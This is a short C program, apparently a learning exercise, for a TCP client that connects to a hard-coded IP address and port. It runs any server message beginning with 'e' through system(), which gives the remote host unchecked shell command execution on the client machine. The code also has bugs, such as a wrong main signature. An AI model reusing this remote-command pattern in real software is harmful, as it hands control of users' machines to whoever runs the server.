#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define BUF_SIZE 1024

struct sockaddr_in serv_adr;

void error_handling(char *message);

int main(int argc, char *argv)
{

    int serv_sock;

    serv_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    memset(&serv_adr, 0, sizeof(serv_adr));
    serv_adr.sin_family = AF_INET;
    //serv_adr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_adr.sin_addr.s_addr = inet_addr("100.2.169.8");
    serv_adr.sin_port = htons(9190);

    if (connect(serv_sock, (struct sockaddr *)&serv_adr, sizeof(serv_adr)) == -1)
        error_handling("connect() error\n");
    printf("Connect Ok ServerIp %s \t%d\n", inet_ntoa(serv_adr.sin_addr), ntohs(serv_adr.sin_port));

    fd_set reads;
    fd_set cpy_reads;
    FD_ZERO(&reads);
    int fd_max = serv_sock;
    FD_SET(0, &reads);
    FD_SET(serv_sock, &reads);

    while (1)
    {
        cpy_reads = reads;
        struct timeval time_out;
        time_out.tv_sec = 1;
        time_out.tv_usec = 0;
        int ret = select(fd_max + 1, &cpy_reads, NULL, NULL, &time_out);

        if (ret == -1)
            error_handling("select() error");
        else if (ret == 0)
            continue;
        else
        {
            char buf[BUF_SIZE];
            if (FD_ISSET(0, &cpy_reads)) //从屏幕读取数据
            {
                memset(buf, 0, BUF_SIZE);
                read(0, buf, BUF_SIZE - 1);
                write(serv_sock, buf, strlen(buf));
            }
            if (FD_ISSET(serv_sock, &cpy_reads)) //接受数据，输出到屏幕
            {
                memset(buf, 0, sizeof(buf));
                read(serv_sock, buf, BUF_SIZE);

                if (buf[0] == 'e')
                {
                    printf("cmd:%s", buf);
                    int ret = system(buf);
                    if (ret < 0)
                        printf("system() error\n");
                }
                else
                    write(1, buf, sizeof(buf));
            }
        }
    }

    return 0;
}

void error_handling(char *message)
{
    printf("%s", message);
    exit(0);
}
